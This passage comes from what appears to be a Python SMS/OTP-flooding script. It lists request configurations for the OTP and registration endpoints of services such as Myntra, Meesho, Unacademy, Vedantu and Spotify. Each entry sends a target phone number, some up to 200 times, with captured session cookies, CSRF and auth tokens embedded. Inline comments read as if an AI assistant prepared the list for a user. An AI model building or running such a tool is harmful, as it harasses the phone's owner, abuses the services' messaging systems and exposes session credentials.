pv_abbr=LOGIN; pv_abbr_d=Login Page; pv_c=login; pv_default_city_id=1630; pv_default_pincode=110001; pv_default_pincode_display=110001, New Delhi; pv_load_more_after_records=8; pv_ajax_load_more_records=8; pv_match_v_variants=; _fbp=fb.1.1715621882325.2109963301; _ga_K6EJPW0E8D=GS1.1.1715621871.1.1.1715621890.41.0.0; city_id=1630; default_city_id=1630; pincode=110086; manual_city_selected=1",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"perform_action=sendOTP&mobile_no={phone}&action_type=order_login",
        "count": 3
    },
    
    {
        "url": "https://vidyakul.com/signup-otp/send",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "vidyakul_selected_languages=eyJpdiI6ImF1QUVZTjlSaXlxWkVZeUVJT0puNFE9PSIsInZhbHVlIjoiM2UwTExVUmxnNGYyZW1jeEhZYmgyS1wvdEJIdmw1dzFwSnJZWUhGdmF6U009IiwibWFjIjoiOGM3NTBlYjQ1Y2JjODJjYmU1ZGY1Y2EyNTc4YWI0Mzc1YmRmYWRkZTY5Y2QzMjY3NjExOTRiMGVlMmVhMGU4MiJ9; _gcl_au=1.1.1032572450.1715943378; XSRF-TOKEN=eyJpdiI6IjViN3I2Q0h4aG02XC9TVjUwZjdkcklnPT0iLCJ2YWx1ZSI6InF4bDk0RHhMRHhjcVJsVTlPYnk4MHlWaGJcL210N2poZ3JpaldpdlQ1YVwvUTFsSFwvU2lTV1BERWNFTFR4eTJkUnVsclNxMzJUN3VoRjh0cWI4bjdWMEVBPT0iLCJtYWMiOiI3YzJmZGY5NTMzMGQ3MmMwZGExYTEwNDc1MTk3MzVkOTE4ODk1YmI3NTJiZjViNGRmYThiOGVlZGU2YWNmNzg5In0%3D; vidyakul_session=eyJpdiI6IjdHamVPRmNoY1NwS0QzaVJNTFpSZGc9PSIsInZhbHVlIjoiM2Uxc2lnQThTR0tObHBCbFo1Z01tS1kxejM2TjRQNEFlNGhzT05ieEpodzFURVBcL3lJU01oYlRcLzFuUDlmT3RVWTF3ZERJSlN1SSttWHpYazExNDJOUT09IiwibWFjIjoiYmY0NDU0ODMxZTcyZTM2NGFkZmExNmM0YjU3OTY4MmUxNTg5ODM0NWY0NTM1ZWFhODJhMGEyODY0ZTYxNDBjZCJ9; vidyakul_selected_stream=eyJpdiI6Inc3cHVkS05wRm1KTVBJVjhpWmRORlE9PSIsInZhbHVlIjoib3E1aHk0bWJMak9UZGs3NmtJQ0hOcXN0XC9Bdm16YmpUT1NOVFRjQ21QaGc9IiwibWFjIjoiMGNhYzBjMjQyN2E0NmY5NGRkYTQwZjlhOTE4ZDMxNzAyYzNiMmFlYWMxMTg5MzRkZWExY2I1NDA1MjQwMzM5MiJ9; initialTrafficSource=utmcsr=google|utmcmd=organic|utmccn=(not set)|utmctr=(not provided); utmzzses=1; trustedsite_visit=1; WZRK_S_4WZ-K47-ZZ6Z=%7B%22p%22%3A1%7D; _hjSessionUser_2242206=eyJpZCI6IjYxZTE2NGEyLTc0ZDYtNTQ3NS04NDIyLTg0MTYwNDhmMDhhYSIsImNyZWF0ZWQiOjE3MTU5NDMzOTQ1ODksImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_2242206=eyJpZCI6ImI0NGUwMmRkLTlhMjktNDJjMi1hMjA4LTdmYWE0NGFhNTYxYiIsImMiOjE3MTU5NDMzOTQ2MTQsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _fbp=fb.1.1715943395600.1219722189; _ga=GA1.2.2084879805.1715943396; _gid=GA1.2.840887730.1715943396; _gat_UA-106550841-2=1; _ga_53F4FQTTGN=GS1.2.1715943400.1.0.1715943400.60.0.0; ajs_anonymous_id=e2b40642-510a-4751-82ba-9f4a307f6488; mp_d3dd7e816ab59c9f9ae9d76726a5a32b_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18f863276877d02-084cb1dab8c848-26001c51-100200-18f863276877d03%22%2C%22%24device_id%22%3A%20%2218f863276877d02-084cb1dab8c848-26001c51-100200-18f863276877d03%22%2C%22mp_lib%22%3A%20%22Segment%3A%20web%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22mps%22%3A%20%7B%7D%2C%22mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D%2C%22mpus%22%3A%20%7B%7D%2C%22mpa%22%3A%20%7B%7D%2C%22mpu%22%3A%20%7B%7D%2C%22mpr%22%3A%20%5B%5D%2C%22mpap%22%3A%20%5B%5D%7D",
            "origin": "https://vidyakul.com",
            "priority": "u=1, i",
            "referer": "https://vidyakul.com/class-12th/test-series",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-csrf-token": "el0GIsHQSO3Y4upLoQOm3coVWNEiNtiKJONg2LJx",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"phone={phone}",
        "count": 3
    },
    
    {
        "url": "https://api.woodenstreet.com/api/v1/register",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.woodenstreet.com",
            "priority": "u=1, i",
            "referer": "https://www.woodenstreet.com/",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"firstname": "Astres", "email": "abcdhbdgud77dd@gmail.com", "telephone": phone, "password": "abcd@gmail.com#%fd", "isGuest": 0, "pincode": "110001", "lastname": "", "customer_id": ""}),
        "count": 200
    },
    
    {
        "url": "https://www.bharatloan.com/login-sbm",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "ci_session=pnui9tc6o5q1upng9gj21d0dqvdna36a; _ga=GA1.1.926584566.1759828023; _gcl_au=1.1.105500372.1759828023; _fbp=fb.1.1759828025039.398634452552158052; _ga_EWGNR5NDJB=GS2.1.s1759828023$o1$g1$t1759828028$j55$l0$h0",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"mobile={phone}&current_page=login&is_existing_customer=2",
        "count": 200
    },
    
    {
        "url": "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.vedantu.com",
            "referer": "https://www.vedantu.com/register",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "cookie": 'LAST_SOURCE_UTMS={"utm_campaign":null,"utm_source":"google","utm_medium":"organic","utm_term":null,"utm_content":null}; FIRST_SOURCE_UTMS={"utm_campaign":null,"utm_source":"google","utm_medium":"organic","utm_term":null,"utm_content":null}; _ga=GA1.1.1378903274.1772892282; _fbp=fb.1.1772892282542.555789860833656960; moe_c_s=1; moe_uuid=4d2637ec-fafc-466f-b12e-3f09bd82026c; _uetsid=96ff2f401a2e11f1a00dd3ad9ceb5f06; _uetvid=96ff79801a2e11f1975c3f8516672dcf; moe_u_d=HcdBCoAgEAXQu8y6gRSx7DLydUYIhCBzFd09cfleavGqQkdBbbqQRIjo8HP3yX4OEDJ88mFlKxB2NmcOUMObN7C7Seq00PcD; moe_s_n=RcoxDoMwDIXhu3hOpMRxa8NVqspK3FSqKmAIG-LuEBbG971_g6Z_GEEeUQxT8d8Sq6dPJJ-Ns8-pkFkaKhUDd8ZNVxgjM8qAKCjh2XW6VEJwYPrTtc_Xuz_17imIMCcHsy7aTt0P; v-auth-token=8HQ63zA7QqVd8mMu; auth-token=8Hq63zA7QqVd8mMU; _ga_35N6JBZRVC=GS2.1.s1772892282$o1$g1$t1772892304$j38$l0$h0; _gcl_au=1.1.1507155657.1772892281.144488657.1772892303.1772892304'
        },
        "data": lambda phone: json.dumps({
            "email": None,
            "phoneCode": "+91",
            "phoneNumber": phone, 
            "sType": "VEDANTU_F_7_N",
            "sValue": "FC34EE3ED23399CD7622BA1851D3E",
            "token": "5nXaR2BzqApBb3Wf", 
            "ver": "1772629389",
            "version": 2,
            "whatsappCommunicationEnabled": False
        }),
        "count": 10
    },

    {
        "url": "accounts.spotify.com",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://accounts.spotify.com",
            "referer": "https://accounts.spotify.com/en-GB/v2/login/phone?continue=https%3A%2F%2Fopen.spotify.com%2F%3Fflow_ctx%3Da0d42be5-9846-43ac-a246-e10ec5a0f588%253A1772916319&flow_ctx=a0d42be5-9846-43ac-a246-e10ec5a0f588%3A1772916319",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "x-csrf-token": "013acda719ac9087ff851d2751dafc8e4e362f6de03137373238393437353338353",
            "cookie": "sp_t=01feeabb-7200-4c63-ab6d-2b62affbf925; sp_new=1; sp_landing=https%3A%2F%2Fopen.spotify.com%2F; sp_landingref=https%3A%2F%2Fwww.google.com%2F; _cs_mk_ga=0.6398613903853394_1772894713970; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Mar+07+2026+20%3A15%3A14+GMT%2B0530+(India+Standard+Time)&version=202601.2.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=https%3A%2F%2Fopen.spotify.com%2F&groups=s00%3A1%2Cf00%3A1%2Cm00%3A1%2Ct00%3A1%2Ci00%3A1%2Cf11%3A1%2Cm03%3A1%2CID01%3A1; _ga=GA1.2.1348970237.1772894714; _gid=GA1.2.1665680748.1772894715; _gat_UA-5784146-31=1; sp_adid=b6db5155-8f4c-4d88-a9f8-a6cb0d0ab3da; _ga_BMC5VGR8YS=GS2.2.s1772894715$o1$g1$t1772894715$j60$l0$h0; _ga_ZWG1NSHWD8=GS2.1.s1772894714$o1$g0$t1772894718$j56$l0$h0; sp_sso_csrf_token=013acda719ac9087ff851d2751dafc8e4e362f6de031373732383934373533383530; __Host-sp_csrf_sid=5db3fac2c9c03a1245f1c07e1db92b7c13c6dbd4ee03b8f759d1f2be7b41b4dc"
        },
        # Remember: URL-encoded payload formatting, NOT json.dumps!
        "data": lambda phone: f"phonenumber=%2B91{phone}&version=2",
        "count": 5
    },
  
    {
        "url": "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://unacademy.com",
            "referer": "https://unacademy.com/login?redirectTo=%2Fsettings",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "x-platform": "0",
            "cookie": 'AMP_MKTG_d90ac5135c=JTdCJTIycmVmZXJyZXIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRnd3dy5nb29nbGUuY29tJTJGJTIyJTJDJTIycmVmZXJyaW5nX2RvbWFpbiUyMiUzQSUyMnd3dy5nb29nbGUuY29tJTIyJTdE; _fbp=fb.1.1772890368546.969189131843112476; _ga=GA1.1.1627550583.1772890370; _gcl_au=1.1.659636677.1772890367.463490768.1772892043.1772892043; isDarkModeOn=; ajs_anonymous_id=89b3dbc3_ae0b_4d55_ad66_7ff04cd3ca6e; un_session_id=69c6c8c4_4456_4637_badc_a32e518525e7; anonymous_session_id=87188bf7_6429_4d53_a406_c05d0716b352; ak_bmsc=DADEF3DE9778C1346D8C5C912BF7F9A8~000000000000000000000000000000~YAAQxlA7F1Cw9KOcAQAA7JouyR9YVbgo12F3Q+big1Vkot9HCKksQoc44kMcMdwtbPQmIg4gdGZosAMK3fj9in6Vs+RBQT1JmOUSiURZTJ4EnsjejKQ45xmERmP5XOQrvZfekKqob92loVu98ZO1rrcACaSs/PlLVsURR0npQaTp7N5dChUmU1aeKgwr/2TrbSRpNqncauf6QgevGMrVaZCzbCqBclwld1FkVELNOGy3MVheurDVY3WoGpaDva+14/7NXxENCoU2l3sXxyI8qfdpHBi1QC0bBFKOUTPpy3vKn2VKlq4rOw5dEVVyJ5tVY5TmbttpbJ4pO3erHLLGOfBAgVAc2wXsqtHoe5ne; _ga_6JX23YC5TQ=GS2.1.s1772901802$o2$g1$t1772901812$j50$l0$h0; AMP_d90ac5135c=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJlZDIyMjc2My1jOWQ2LTRjMGYtYTZhOS1kMTgwMjVjNzY3MDAlMjIlMkMlMjJ1c2VySWQlMjIlM0ElMjJOQSUyMiUyQyUyMnNlc3Npb25JZCUyMiUzQTE3NzI5MDE4MDAyNjMlMkMlMjJvcHRPdXQlMjIlM0FmYWxzZSUyQyUyMmxhc3RFdmVudFRpbWUlMjIlM0ExNzcyOTAxODE3OTIxJTJDJTIybGFzdEV2ZW50SWQlMjIlM0E4NyUyQyUyMnBhZ2VDb3VudGVyJTIyJTNBMSU3RA=='
        },
        "data": lambda phone: json.dumps({
            "phone": phone, 
            "country_code": "IN", 
            "otp_type": 1, 
            "email": "", 
            "send_otp": True,
            "is_un_teach_user": False
        }),
        "count": 10
    },

    {
        "url": "https://www.myntra.com/gateway/v1/auth/getotp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.myntra.com",
            "referer": "https://www.myntra.com/login",
            "deviceid": "8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f",
            "x-myntraweb": "Yes",
            "x-requested-with": "browser",
            "x-location-context": "pincode=276304;source=IP",
            "x-meta-app": "deviceId=8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f;appFamily=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36;reqChannel=web;channel=web;",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            # I kept the giant cookie string intact for you, wrapped in single quotes!
            "cookie": '_pv=default; dp=d; at=ZXlKaGJHY2lPaUpJVXpJMU5pSXNJbXRwWkNJNklqRWlMQ0owZVhBaU9pSktWMVFpZlEuZXlKdWFXUjRJam9pWW1SallUY3labUl0TVdFME5pMHhNV1l4TFRrMU5HVXRaRFk0T0RJMVpUazJaR1l4SWl3aVkybGtlQ0k2SW0xNWJuUnlZUzB3TW1RM1pHVmpOUzA0WVRBd0xUUmpOelF0T1dObU55MDVaRFl5WkdKbFlUVmxOakVpTENKaGNIQk9ZVzFsSWpvaWJYbHVkSEpoSWl3aWMzUnZjbVZKWkNJNklqSXlPVGNpTENKbGVIQWlPakUzT0RnME5UUTJOVFVzSW1semN5STZJa2xFUlVFaWZRLnlVbHlrazl3dGJMRWUtYk44Rnd3LVdNeDdKLUdXdXBxVGtZV1AxbmsxNWM=; lt_timeout=1; lt_session=1; _d_id=8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f; mynt-eupv=1; _ma_session=%7B%22id%22%3A%22321db0d1-6207-43bc-a3f2-5c7239376c6e-8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f%22%2C%22referrer_url%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm_medium%22%3A%22toi_rev%22%2C%22utm_source%22%3A%22gh_toi%22%2C%22utm_channel%22%3A%22%22%2C%22utm_campaign%22%3A%22gh_toi_Listicle_11%22%7D; mynt-ulc-api=pincode%3A276304; mynt-loc-src=expiry%3A1772904097406%7Csource%3AIP; _mxab_=config.bucket%3Dregular%3Bcoupon.cart.channelAware%3DchannelAware_Enabled%3Bcart.cartfiller.personalised%3Denabled; microsessid=36; _xsrf=EF1TC2uqvmAw5ghVguIxFGgL7ngY6QDs; x-mynt-pca=DW9ewvwL7HrxiGbkjZ2hFK3s7pFgT3HFDQ_ZeuIXKLzQCOACu-0JgP6YuhIpLyrdmZENNb5EDHkGunzevNDvBxJuMWxAS63_FNdQckJRXBV-KtveKSe-8dLhJPtvOBnTtKQ614wjhT9Cb6OhrYF3Q-3Y4R12a5r_sEWBSrVhB5wDaSujmICTOw%3D%3D; _gcl_gs=2.1.k1$i1772902655$u182646842; _gcl_au=1.1.2115279374.1772902658; tvc_VID=1; _cs_ex=1; _cs_c=1; _fbp=fb.1.1772902659177.89796816493115098; _scid=xg-dY-TjRiq9sduWfgyuG9EUWee6XE03; _ScCbts=%5B%5D; newUser=true; user_session=On2V4AOgMFTIeWH4uSXFMQ.vLukKwu8WvOXbRGrfNHYZUkr0K58GRrdzbIOFTaUJgv0kX1HW22JU8kNDSZWXK6VxR1yOUnfZndd7CzRU0zK5MDqAq_6FtcVhKE_-MhlezDVQXE8E463uCT1XdUHZvfpR1JIIzNaEEMhwdly6OlbDA.1772902659279.86400000.Ol1QpU4FFO72wibZpmLliuG-ellaJv7XzLmipgWsB24; bm_mi=C62E44073780BA80AE243C5375E18F02~YAAQhQFAFxM037mcAQAAV8U7yR/bQpsENyoU5gZcGMCP4eN+U/1zB/UFGz9Oe25ceisDzScGIa+f1RnFHWHvr4UgsDFWykxyfHwWhJqX+5sv5647A9f4A373e4JD6EEKZll0cs6mMuXl+Wg5ePN75bniKQWFboz+oTmMhb0P2G+0+3JvP/wwMkykFMjLm2esilGoTcDGbPkUJtKfMGikAxhK2cVcTcv3WQz8qIbxsUeL2v+deyw8jHvhnrUgS8Qq3DYmifOtL1x+PFqu2pBDh+czWKilGgHVwGfr4s2Eos/WJXqXzcQPIahQR1yk74YR1vE=~1; bm_sz=3F2EE3A0D8845FAC05AFEC5045ED9BDB~YAAQhQFAFxU037mcAQAAWMU7yR9M8U2K4T5HtZIJkxS8LKbr/Ye2RvOX3/t5qVZKcWkruiX14cwxvXDH44QtPd0+nuhLNJmpDapS2dWSwU3UbdbAs176xrt+Y4X9ky/LfoUndLOVKhmcoDrZf8KvJ/hu8dt3AjKvQuDM+/ceESOFnGSm0LqSmkswRZo+nSSPiGrkmwUN+z/nm2GYMh5QhdGXlNkYttot/gz9BEjDwd3W0b3kMakTCG2HtI5voHR15kdZojDvtXpWn2MtbEQiwXaXSMzeAPMVNVnFAqu8YkfbtPDu4MVcJbTVIsIHvTLpViGlb0k60torgWnqY/pKlFMCXtKsx4LEonGS/Vpt+6FzbS0R6CBHlz9Zjfjo6+veJeU6QOC1s+mg/MMYtk7hHAPpfG4+s+lfAA==~4538950~3555636; ak_RT="z=1&dm=myntra.com&si=1f42ccda-4c1c-4a31-a079-398d09fa98e2&ss=mmgkgrt9&sl=1&tt=4g2&rl=1"; _abck=A3EE61F97882FE89B19B864C77CBC2BD~0~YAAQhQFAF7k037mcAQAAXsY7yQ+rkZoPPP7zMeIi2fCxjnCtcMGi06FX9s/4NCFW75PpCkTf+DpGykdh146voP3l6erxWe7MeVeSkuIDg6HNy/QzbL8/7iYmd8y8fZqU16mQilIC5W1daTc7OPdkoDFIsRqcUBb7rk71ODXtLjLa95pMLBXAHJgcyL0z9+X2EEbjOYkBwvvSDYm3HJo3sumNqF92Ioc9fCvMkLxAvfu8FXF6sUvuZlVZ9Qpcxn+Q4c/BrgP0lZpKUJ2anIVXkz31kiwSFwxmrr35YXvXsKZd82lw8UQ7FK92zkIKH36EYjMSpcs4K7V6oxrx1258aznxQxp7tCVgh6Dv8B/eRGNzgo2ST3IXan0YpqlGxrB8uBY92CX38cpRfDEws+fUQjVVhHc2iXXssE/0xtvuHa62US5DRKAwRqcDZ+2dKRxA03pHZyhIB7Iz4d4mLknRFTrAuL6PUGlV+CRSvTjlsin7kmgkFTKCaf/L/vF5kY5dc79O/G1hH5dJ4Nfu8bQbcpv1xZ0UnjF/w0VAKYldrnmr2kZW7OwEfL0yVAE/jqsepbdmEDVjjOxcn88t2K23D1HCROoA6XdAs+wOV/nS+cgodkVDheCWCA2YEvqvFkCt7dY=~-1~-1~-1~AAQAAAAF%2f%2f%2f%2f%2f49pOHTOjo%2fYjHkLJrBl7devbAwuOXWHyno6ME0UJDSHCgVERDxcIaK%2fyYdlTu5zpMuH+q92FAMYctoD1p2N7LcZmjaxApKWV9bQ~-1; _scid_r=34-dY-TjRiq9sduWfgyuG9EUWee6XE03OfS7Wg; bc=true; utm_track_v1=%7B%22utm_source%22%3A%22direct%22%2C%22utm_medium%22%3A%22direct%22%2C%22trackstart%22%3A1772902664%2C%22trackend%22%3A1772902724%7D; AMP_TOKEN=%24NOT_FOUND; ak_bmsc=803CCD1846F387A46F5393A43D5FC9EC~000000000000000000000000000000~YAAQhQFAF2I437mcAQAAR8s7yR/y3+nHiF04NIS0TOnItCD63/pny+NBiB99iDMdb5KGnRtd4GKlZo4E8oxctakBnxcWMo7J6cLK9DX/hXyUV1r1rkUBL1FpmwoX9if4J/Cdd/nEtjK2dlzPr08uY6vKnRkIR/vk01Rqrjtl15zsV1KPtNAfLjqvU3OchxHafsjBIt/dLBn91bWOZrDU6+7h8aksPkCQLyz3d6B1Rlx9gbtXqJGDX1jKXsaoL1QAjKTq6QjHhlsWXxcl7tEZn6uydfNXj6HmW2FLxro5Hlpw1SuKXE3cvqwUMhxjzsaI8r6CuJhiWwGChby30fP0wU9+PMZvIn1z/EWrSEP+X/rN4Hp6ozzwIG3gjOKfVL+JO6tTRhV3xUl+ObBsug4JC1tnBpEK6wSUz14lEKgNp1lWrnz0bUZmgz9ZthOlmhhfnhYJX9NI7k3Vt8SiUuR4gDc1ZZizOSRIaqS/VIc3LwOC9gJOrDE=; G_ENABLED_IDPS=google; __insp_wid=617845923; __insp_slim=1772902664345; __insp_nv=true; __insp_targlpu=aHR0cHM6Ly93d3cubXludHJhLmNvbS9sb2dpbj9yZWZlcmVyPWh0dHBzJTNBJTJGJTJGd3d3Lm15bnRyYS5jb20lMkYlM0Z1dG1fc291cmNlJTNEZ2hfdG9pJTI2dXRtX21lZGl1bSUzRHRvaV9yZXYlMjZ1dG1fY2FtcGFpZ24lM0RnaF90b2lfTGlzdGljbGVfMTElMjZnYWRfc291cmNlJTNEMQ%3D%3D; __insp_targlpt=TXludHJh; _sctr=1%7C1772821800000; __insp_norec_sess=true; utrid=RRJzeApGDw5yHkpRQlJAMCM1NzQ2MTI0MTQkMg%3D%3D.01769fa0c91e71bc2438c3599809d62d; bm_sv=B78AE0B5B41F8CA0AEF07D46B7AD4172~YAAQhQFAFx1K37mcAQAAxeQ7yR+SFvNNeLlcBMUyZfM8qTYjq9etnGEO0KGSpfjHAwCYQOVQvC6V1mbJZ6CJxy6FiRgwovu25kGak1ua90KTUFGWWHCx/IyIc4gfWZ7oePeTlonPE+3zm0n6fQheCClTMvzRETyMhgzC/3UdGjKXvGkNEJN7l9BSHjXNZnBl+MjtZDOaMOI2QREAIe11c8V18NDS+t4+59GHyaUX4rtuAJaCu/arB7JrkinP8yPrXA==~1'
        },
        "data": lambda phone: json.dumps({
            "phoneNumber": phone,
            "signup": "ONECLICK"
        }),
        "count": 10
    },

    {
        "url": "https://www.meesho.com/api/v1/user/login/request-otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "meesho-iso-country-code": "IN",
            "origin": "https://www.meesho.com",
            # The referer string is huge here because you were looking at a specific saree product!
            "referer": "https://www.meesho.com/auth?redirect=https%3A%2F%2Fwww.meesho.com%2F%5Bcategory%5D%2Fp%2F%5Bp_id%5D&srsltid=AfmBOoraGrJMAAiUaMvE79njiQJ2WvjlySO4Sfg9zyFZpYCgrBCJ61Y4&category=new-sadi-fancy-sarilycra-saree-women-new-sadi-for-lycra-ruffle-sari-fancy-party-wear-saree&p_id=2xzra5&source=profile&entry=header&screen=PDP",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            # Massive Akamai-protected cookie string wrapped in single quotes
            "cookie": 'ORDER_BLOCK_EXPERIMENT_COOKIE=0.15; ak_bmsc=675E2E85662EBD4232AEF47AB01B143D~000000000000000000000000000000~YAAQ7OgyF4uHZ7WcAQAAHUI7yR9QD5gF8e9uf8AeaEiXfLm65ZfFuu4RtitSe4L4UMDl33fS7e495p49Dr/nQSpkcah+7H3jtg5m0vlk09hPpu8zW6nTq4yJaYETz1d07LLc2oG8XKKW+mqen5LC6NBx1Wvep7I5TXk0mGNj9UmbK2XiOWwruA6ZwA9EDfN7+4CaAgi9lRW9mXSQ8wwok3xJvukDUpgGqfsPyDXO8smtI0fvYhbQAl0td4Jkyq0BrbourAVfIhOv0mEc30KbH775TNw97qw5wDgPxw7d8l3aiqVdbndpXCFYP3OZsJa89r7Ww9nkotn+5nyuiKX3hENyXaXlZyf2qFc+zZRrbb80cGV52OkmTVfrKc4jxHtFVRfddES1OUSkTrUpE+/0/so=; bm_sz=AF88F784356724C9DEB6E2BC3F00C740~YAAQVvEBF+ImgaGcAQAAiaQ7yR95Ul+h0x49/ah1CWo2xVdpX1pQcqFAvTdWTNOl0Z/Q/DCe3oE9/itShuByNGj3yDSBIo3wWTKE/l1Hj31kYrNIIq3P049CkFfWPHCUuK8D3msAPhQoMp8JdNqlR3ZXH+gtnFyOfQsf+I3Ahdpqh4zdywFhA1ftP6kwW9weFLDcTy+cUndQ8dx90ZSB6nePjpr5TLV/QGZFb/LZCsBBeoEUH12l5L3nBzunmJ8/QcsWv/Abhip91jKGlzaib4mNd8tHbAz6BRqb3SaqDqhezE5VT6j2zEbc3J1RLYrOuqn5553DRImvnjCEEB0CzYlrtzFR4XXuK5IXQnJXE6IAaU7D9jaNPcO9f9DxfhMLVloNDn86bRb3LAcagUmMtfhgQ3xO~4600134~3289141; INP_POW=0.6891207189804555; bm_ss=ab8e18ef4e; bm_s=YAAQVvEBF6wsgaGcAQAAM9s7yQUkKLxwiiF6VIR/M7zrZRFQmdQ0kEMtekKzXs0F/rtbPzKriES4FAut4cZ4U+xDcf/eKasbXghktDk8/OZVJQ6jMrwwXH39aTd2vb3Gin0nKGdkDKEtEAzxmV82FtINvcYjWdvi1eAPFJgsNaop/rfblg70PppnjgQoO6ysdEOQrN9JwQTM+6F17nUosoKhEWZI1uiwQWE7RfC+MJmwEEWFNPf62mQ96QUXtqZQMzUnwkxEW/AXrpef6V/xJ0S0wwZ3G9y2ca2Y7XWvnZNdZjUlrazEx+fNFIQcDCNnYzoThdzpywNfSx1Mz8iV7WO9m8x98OLnW6nJiNVm1cLAlZ00ngGoQJ/AkW8PyboRZWOuIzzYW3QouI7nvLSbbG3zIjIt+dJZ7hYSkrz9e8Fu4WegYyuozIkR+GkMcmGpNcxJyOh4ZUPk3dUm8cbmxsRAWtvEMW7Sbu+b8SN6451B8+3NLV9Ivlm92kawaX/+jjZPXRGYL2mwRUtSxeUjZgSQQIWrsARJzW4j3PSfGfz9SdSwKY80O+qzovUoLO2tX8c=; 